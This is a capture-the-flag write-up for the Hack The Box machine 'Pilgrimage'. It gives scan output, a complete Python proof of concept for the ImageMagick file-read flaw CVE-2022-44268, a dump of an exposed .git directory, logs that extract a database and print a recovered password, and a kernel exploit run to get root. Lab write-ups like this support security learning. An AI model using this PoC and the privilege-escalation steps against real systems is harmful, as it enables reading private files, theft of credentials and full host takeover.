
### Initial access
Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Access the web and found the cve https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/
We modify it to read more file
```python
#!/usr/bin/env python3

import sys
import png
import zlib
import argparse
import binascii
import logging

logging.basicConfig(
    stream=sys.stderr,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

d = zlib.decompressobj()
e = zlib.compressobj()

IHDR = b'\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00'

IDAT = (
    b'x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9'
    b'\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0'
    b'\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F'
)


def parse_data(data: bytes) -> str:
    """
    Parse ImageMagick's 'Raw profile type' data.

    Some versions/output formats contain:
        <length>
        <hex data>

    while other output can contain additional text.
    """

    data = data.strip()

    # Show raw decompressed data for debugging
    logging.info("Decompressed profile length: %d bytes", len(data))

    # ImageMagick Raw profile format normally looks like:
    #
    #   <length>
    #   <hexadecimal data>
    #
    # Try to locate the hexadecimal payload after the first line.
    lines = data.splitlines()

    if len(lines) >= 2:
        payload = b''.join(lines[1:]).replace(b' ', b'')

        try:
            decoded = binascii.unhexlify(payload)
            return decoded.decode(errors='replace')
        except (binascii.Error, UnicodeDecodeError):
            pass

    # Fallback: try the entire data as hex
    compact = b''.join(data.split())

    try:
        decoded = binascii.unhexlify(compact)
        return decoded.decode(errors='replace')
    except (binascii.Error, UnicodeDecodeError):
        pass

    # Final fallback: return raw text
    return data.decode(errors='replace')


def read(filename: str):
    if not filename:
        logging.error('you must specify a input filename')
        return

    res = ''

    p = png.Reader(filename=filename)

    for k, v in p.chunks():
        logging.info(
            "chunk %s found, value = %r",
            k.decode(errors='replace'),
            v
        )

        if k == b'zTXt':
            try:
                name, data = v.split(b'\x00', 1)

                logging.info(
                    "zTXt profile name: %s",
                    name.decode(errors='replace')
                )

                # zTXt:
                #   keyword\0
                #   compression method (1 byte)
                #   compressed data
                compression_method = data[0]
                compressed_data = data[1:]

                if compression_method != 0:
                    logging.warning(
                        "Unexpected compression method: %d",
                        compression_method
                    )

                decompressed = zlib.decompress(compressed_data)

                res = parse_data(decompressed)

            except Exception as ex:
                logging.error("Could not parse zTXt: %s", ex)

    if res:
        sys.stdout.write(res)
        sys.stdout.flush()


def write(from_filename, to_filename, read_filename):
    if not to_filename:
        logging.error('you must specify a output filename')
        return

    with open(to_filename, 'wb') as f:

        f.write(png.signature)

        if from_filename:
            p = png.Reader(filename=from_filename)

            for k, v in p.chunks():
                if k != b'IEND':
                    png.write_chunk(f, k, v)

        else:
            png.write_chunk(f, b'IHDR', IHDR)
            png.write_chunk(f, b'IDAT', IDAT)

        # CVE-2022-44268 payload
        png.write_chunk(
            f,
            b'tEXt',
            b'profile\x00' + read_filename.encode()
        )

        png.write_chunk(f, b'IEND', b'')


def main():
    parser = argparse.ArgumentParser(
        description='PoC for CVE-2022-44268'
    )

    parser.add_argument(
        'action',
        type=str,
        choices=('generate', 'parse')
    )

    parser.add_argument(
        '-i',
        '--input',
        type=str,
        help='input filename'
    )

    parser.add_argument(
        '-o',
        '--output',
        type=str,
        help='output filename'
    )

    parser.add_argument(
        '-r',
        '--read',
        type=str,
        help='target file to read',
        default='/etc/passwd'
    )

    args = parser.parse_args()

    if args.action == 'generate':
        write(
            args.input,
            args.output,
            args.read
        )

    elif args.action == 'parse':
        read(args.input)

    else:
        logging.error("bad action")


if __name__ == '__main__':
    main()
```
Dump .git
```
 git-dumper http://pilgrimage.htb/.git/ pilgrimage-git
┌──(kali㉿kali)-[~/HTB/Pilgrimage/pilgrimage-git]
└─$ cat login.php 
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');

```
Read db
```
┌──(kali㉿kali)-[~/HTB/Pilgrimage]
└─$ ./poc.py generate -o poc.png -r /var/db/pilgrimage             
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Pilgrimage]
└─$ wget -O out.png  http://pilgrimage.htb/shrunk/6a9fbebf768ae.png
--2026-09-08 03:53:24--  http://pilgrimage.htb/shrunk/6a9fbebf768ae.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.36.135
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.36.135|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 969 [image/png]
Saving to: ‘out.png’

out.png                                                    100%[========================================================================================================================================>]     969  --.-KB/s    in 0s      

2026-09-08 03:53:25 (257 MB/s) - ‘out.png’ saved [969/969]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/HTB/Pilgrimage]
└─$ ./poc.py parse -i out.png                                      
2026-09-08 03:53:27,158 - INFO - chunk IHDR found, value = b'\x00\x00\x00\x05\x00\x00\x00\x05\x08\x00\x00\x00\x00'
2026-09-08 03:53:27,158 - INFO - chunk gAMA found, value = b'\x00\x00\xb1\x8f'
2026-09-08 03:53:27,158 - INFO - chunk cHRM found, value = b'\x00\x00z&\x00\x00\x80\x84\x00\x00\xfa\x00\x00\x00\x80\xe8\x00\x00u0\x00\x00\xea`\x00\x00:\x98\x00\x00\x17p'
2026-09-08 03:53:27,158 - INFO - chunk bKGD found, value = b'\x00\xff'
2026-09-08 03:53:27,158 - INFO - chunk tIME found, value = b'\x07\xea\t\x08\x074\x1f'
2026-09-08 03:53:27,158 - INFO - chunk zTXt found, value = b'Raw profile type\x00\x00x\x9c\xed\xddKr\xe3 \x10\x80\xe1=\xa7\xf0\x11\x1a\xe8n\xc4q\xa2\x07\xf7?\xc2\x80,\x8f\x1f\x19Wf\x92\xcc"\xae\x1fU\t,\xd1\x9f\xa0\xcb^A\xc9!\x9cN\xa7$:I\xb0lQ\x17\xafE\xdd\x92\xb8{+\xc9W\x8fE\x93\xe4,\x12E\xc6\xa9W*\xa9\x1f\xe7\x92\xdb\xd1\xb0\xa3\x96 \xf7E\x1f\xea\xc7\x12\x9f\\\x7f\x07}P\xc6H\xd2\xa6s\x8d\xb2Jk\xd3\xfe\xc8m~\x1bPs\x93\xb6\xac\xfb\xc7\x96\xa7\x7f\x83?="                           \xa0\xef\x87\xca"YJ,\xb1\xc6*q\x8a\x96\x8b\x06\x8f\x9e|q\xf3:\x96y\xbd\xb8\x95|\xdb\x16\xd5lIM\xa3\xa9Z\x92~\x8e\x9at\x19\xed\xdb~!I\x9a\x8a\x95\x8e\xed\x9d\xcc&\xd3\xde\x92\x1e\\u\xed\xe1\xc9j\x12\x9d\xfb\x9dQo\xda\xc6}\xdd\xcc:\xb6\xa4\x1e\xb5\xaf5\xd7\xd0\xbd\xea[w\xef\xa0?\x05\x941\xd6\xf1\xc8\xd1{u\xbb\xef\x1f\x1e\x02j\x9aE\xc5c\xc9m\xcc_d\x7f\x8cv`*\xb9\xf4\xc7\x9dW\xbd\xad\xf5.\xd6[\xedr?\x94\xc9\xda\xed\\\xad\xe5x\x97#s\xef\xe0Hm?Fj\xd3\xdc\x81#\xb3\x97Q\xf6\x1c]\x9b\x92\x9e\xa7\xf5\xda\xeb\xc8\xe9\xbbI\x86\xcf\xa4\xb7\xecs\xefG\xd9\x13\xadw\xd0\xbb\x80\x9a\xaa\xa4=b\x1dS\xfa([\xe1\x9a\xae\x91\xad\xeb\x14F\xaen\xa6\x9d\x8f\xef\xe2u\xf5}=\xea(m\xf3}\x99~T_//\xf2\xa3\x05\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02zy(N\x12%\xc7\x92V\xb7\xe0\xabW_J\xdd\xf7]T/\x9e}\xf2\xe6\x9b\xcf\xfdZ\x1a\xfb\x13r\xcc)gy\xbbDKk\xa5\xd7\xe7\xf3\xf7\x8c\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\xe85\xa0ilI\x90\xeav\xd9\x91\xf0\xfb\x1d\x07\xcf\xff\xe6\xe0\xff\x8e\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\xe8\'B\x97w\x1c\xfc\xe5\x8e\x83\xe7\xd0\x17\x0b\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\xd0\xcf\x81\xc2/Jo;\xe0'
2026-09-08 03:53:27,158 - INFO - zTXt profile name: Raw profile type
2026-09-08 03:53:27,158 - INFO - Decompressed profile length: 41534 bytes
2026-09-08 03:53:27,158 - INFO - chunk IDAT found, value = b'\x08\xd7c<\xc3\xc0\xc0\xc0\xc0\xc2\xc0\xc4\xf0\xff?\x0b\xc3g\x06Vv&\xe6\xdf/Y\xff3\xfd\xfd\xcf\xfd\x8b\t\x00s?\t\xc7'
2026-09-08 03:53:27,158 - INFO - chunk tEXt found, value = b'date:create\x002026-09-08T07:52:31+00:00'
2026-09-08 03:53:27,158 - INFO - chunk tEXt found, value = b'date:modify\x002026-09-08T07:52:31+00:00'
2026-09-08 03:53:27,158 - INFO - chunk tEXt found, value = b'date:timestamp\x002026-09-08T07:52:31+00:00'
2026-09-08 03:53:27,158 - INFO - chunk IEND found, value = b''
��e��8|�StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf�+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL,��▒-emilyabigchonkyboi123=indexsqlite_autoindex_users_1users
��      emily

```
Cred `emily:abigchonkyboi123`
### Priv escalation
SSH in and using dirty frag
```
emily@pilgrimage:~$ sudo -l
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
emily@pilgrimage:~$ 
emily@pilgrimage:~$ gcc -O0 -Wall -o exp exp.c -lutil && ./exp
# 
# id
uid=0(root) gid=0(root) groups=0(root)
# 


```
